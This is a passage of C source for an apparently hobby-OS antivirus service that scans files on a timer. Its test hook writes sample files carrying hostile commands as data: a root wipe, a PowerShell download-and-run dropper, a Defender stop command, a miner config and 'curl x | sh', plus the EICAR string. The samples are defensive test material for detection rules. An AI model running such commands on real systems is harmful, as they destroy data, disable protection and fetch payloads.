    for (int i = 0; i < npending; i++) if (!strcmp(pending[i], path)) return;   /* already queued */
    if (npending >= MAX_PENDING) return;
    char *p = strdup(path);
    if (!p) return;
    pending[npending++] = p;
    log_info("safetyshield", "queued check: %s", path);
    if (!scanning && !single) { single = true; ensure_timer(); }                /* start right away */
    gen++;
}

void safetyshield_status(safetyshield_status_t *out) {
    if (!out) return;
    memset(out, 0, sizeof *out);
    out->running = running;
    out->scanning = scanning;
    out->manual = manual;
    out->scan_id = scan_id;
    out->scanned = scanned;
    out->total = MAX(total, scanned);
    out->threats = threats;
    out->last_scan_time = last_scan_time;
    out->next_scan_ms = next_scan_ms;
}

/* ==== test hooks (command line only) ========================================================= */
static void build_eicar(void) {
    /* eicar.org standard antivirus test file, in fragments (no contiguous literal in source) */
    eicar_len = (uint32_t)snprintf(eicar, sizeof eicar, "%s%s%s%s%s",
                                   "X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-",
                                   "ANTIVIRUS-", "TEST-FILE!", "$H+H*");
}

/* Harmless sample files for testing the rules (safetyshield_samples=1 only). */
static void make_samples(void) {
    static const struct { const char *name, *body; } s[] = {
        /* each matches one rule */
        { "ransom_note.txt", "Attention! Your files have been encrypted.\n"
                             "To recover them, send 0.5 Bitcoin to our wallet.\n" },
        { "wipe.sh",         "#!/bin/sh\nrm -rf /*\n" },
        { "miner.cfg",       "pool: stratum+tcp://pool.example:3333\nalgo: cryptonight\n" },
        { "dropper.ps1",     "Invoke-WebRequest http://x/a.exe -OutFile a.exe\nStart-Process a.exe\n" },
        { "disable_av.bat",  "net stop WinDefend\n" },
        { "invoice.pdf.exe", "MZ harmless SafetyShield sample, not a real program.\n" },
        { "photo.jpg",       "MZ harmless SafetyShield sample: a program with a picture extension.\n" },
        { "toolbar.js",      "// istartsurf: your default search engine has been changed\n" },
        { "game.apk",        "PK\x03\x04 harmless SafetyShield sample of an app package.\n" },
        /* these must stay Safe */
        { "safe_note.txt",   "Just a normal note. Nothing harmful here at all.\n" },
        { "article.txt",     "Security news: attackers ran xmrig and mimikatz, then 'rm -rf /*' and "
                             "'format c:'. Never pipe curl into a shell: curl x | sh\n" },
        { "verify.sh",       "#!/bin/sh\ncurl -L https://example.org/f.iso | sha256sum\n" },   /* Risky, not a dropper */
    };
    vfs_mkdirs("/tmp/ss-samples");
    char path[VFS_PATH_MAX], buf[MAX_NEEDLE + 2];
    for (int i = 0; i < (int)(sizeof s / sizeof s[0]); i++) {
        vfs_join("/tmp/ss-samples", s[i].name, path);
        vfs_write_file(path, s[i].body, (uint32_t)strlen(s[i].body));
    }
    int n = snprintf(buf, sizeof buf, "%s\n", eicar);
    vfs_join("/tmp/ss-samples", "eicar.com", path);
    vfs_write_file(path, buf, (uint32_t)n);
    log_info("safetyshield", "wrote sample files to /tmp/ss-samples (test hook)");
}

/* ==== service ================================================================================ */
static int ss_start(void) {
    if (!cur_head) cur_head = kmalloc(HEAD_MAX);
    if (!chunk) chunk = kmalloc(CHUNK);
    if (!scan_buf) scan_buf = kmalloc((size_t)(MAX_NEEDLE - 1 + CHUNK));
    if (!scan_lc) scan_lc = kmalloc((size_t)(MAX_NEEDLE - 1 + CHUNK));
    if (!cur_head || !chunk || !scan_buf || !scan_lc) return -1;
    build_tables();
    build_eicar();
    const char *t = sys_cmdline_get("safetyshield_test");
    test_risk = 0;
    if (t && *t) {
        test_risk = atoi(t);
        if (test_risk <= SS_RISK_SAFE || test_risk >= SS_RISK_COUNT) test_risk = SS_RISK_TROJAN;
        static const char body[] = "NovaOS SafetyShield test file - harmless.\n" TEST_SIGNATURE "\n";
        vfs_mkdirs("/tmp");
        vfs_write_file(TEST_FILE, body, (uint32_t)strlen(body));
    }
    const char *sm = sys_cmdline_get("safetyshield_samples");
    if (sm && strcmp(sm, "0")) make_samples();
    running = true;
    next_scan_ms = sys_uptime_ms() + (test_risk ? TEST_FIRST_MS : SCAN_INTERVAL_MS);
    log_info("safetyshield", "protection on, %d signatures, automatic scan every %d s%s", NCSIG + 1,
             SCAN_INTERVAL_MS / 1000, test_risk ? " (test rule active)" : "");
    gen++;
    return 0;
}

static void ss_stop(void) {
    if (step_timer) { timer_cancel(step_timer); step_timer = 0; }
    reset_walk();
    scanning = single = scan_requested = false;
    running = false;
    clear_list(pending, &npending);
    gen++;
}

static void ss_tick(void) {
    if (scanning || single) return;
    if (npending > 0) { single = true; ensure_timer(); return; }
    if ((int32_t)(sys_uptime_ms() - next_scan_ms) >= 0) start_scan(false);
}

REGISTER_SERVICE(.name = "safetyshield", .display_name = "SafetyShield",
                 .description = "Scans every file for threats automatically every minute",
                 .autostart = true, .restart_on_failure = true,
                 .start = ss_start, .stop = ss_stop, .tick = ss_tick, .tick_ms = 1000,
                 .icon = ICON_SHIELD);
